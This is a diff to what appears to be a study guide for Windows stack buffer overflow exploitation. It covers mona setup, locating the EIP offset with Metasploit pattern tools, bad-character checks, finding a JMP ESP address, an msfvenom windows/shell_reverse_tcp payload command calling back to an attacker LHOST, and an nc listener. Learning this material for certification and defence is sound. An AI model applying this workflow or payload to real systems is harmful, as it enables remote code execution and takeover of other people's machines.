@@ -88,10 +88,11 @@ Install Python 2.7.14 or higher
 
 Launch Immunity Debugger, then "Open" or "Attach" the .exe file.
 
-### Mona Configuration 
+### Mona configuration 
+
+Set the current working directory :
 
 ```
-# Set the working directory
 !mona config -set workingfolder c:\mona\%p
 ```
 
@@ -151,7 +152,7 @@ except:
 
 When the application crashes, EIP should be equal to 41414141 (hex value of "AAAA").
 
-### Crash Replication & Controlling EIP
+### Crash replication & controlling EIP
 
 #### Pattern
 
@@ -165,7 +166,7 @@ Generate a cyclic pattern to find the exact offset of the crash :
 /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <SIZE>
 ```
 
-The size must be higher than the crash offset, now modify the "payload "variable by the cyclic pattern :
+The size must be higher than the crash offset. Now modify the "payload" variable by the cyclic pattern :
 
 ```
 # exploit.py
@@ -208,9 +209,9 @@ Size is the same as the one used to create the pattern. The result should be som
 EIP contains normal pattern : ... (offset XXXX)
 ```
 
-Get the offset, modify :
+Get the offset, modify in exploit.py:
 
-- The "offset" variable in exploit.py 
+- The "offset" variable by the offset
 - The "retn" variable by "BBBB"
 - Remove the "payload" variable
 
@@ -223,7 +224,9 @@ payload = ""
 
 Re-run exploit.py, EIP should be equal to 42424242 (hex value of "BBBB"). You know control EIP !
 
-### Finding Bad Characters
+### Finding bad characters
+
+Certain byte characters can cause issues in the development of exploits. We must run every byte through the program to see if any characters cause issues. By default, the null byte (x00) is always  considered a bad character as it will truncate shellcode when executed.
 
 - !mona bytearray -b "\x00" -> copy results to payload variable
 - Re-run exploit.py
@@ -231,7 +234,7 @@ Re-run exploit.py, EIP should be equal to 42424242 (hex value of "BBBB"). You kn
 - !mona bytearray -b "\x00 + BAD_CHARS" -> copy results to payload variable
 - !mona compare -f C:\mona\oscp\bytearray.bin -a ESP_ADDRESS -> Repeat the badchar comparison until the results status returns "Unmodified". This indicates that no more badchars exist.
 
-### Finding a Jump Point 
+### Finding a jump point 
 
 ```
 !mona jmp -r esp -cpb "BAD_CHARS"
@@ -245,15 +248,19 @@ or
 !mona find -s "\xff\xe4" -m DLL
 ```
 
-### Generate Payload 
+### Generate payload 
 
 msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT EXITFUNC=thread -b "BAD_CHARS" -f py -> Copy the generated shell code setting the payload variable
 
 ### Prepend NOPs 
 
+```
 padding = "\x90" * 16
+```
 
 ### Start nc listerner 
 
-nc -lvp "PORT"
+```
+nc -lvp <PORT>
+```
 
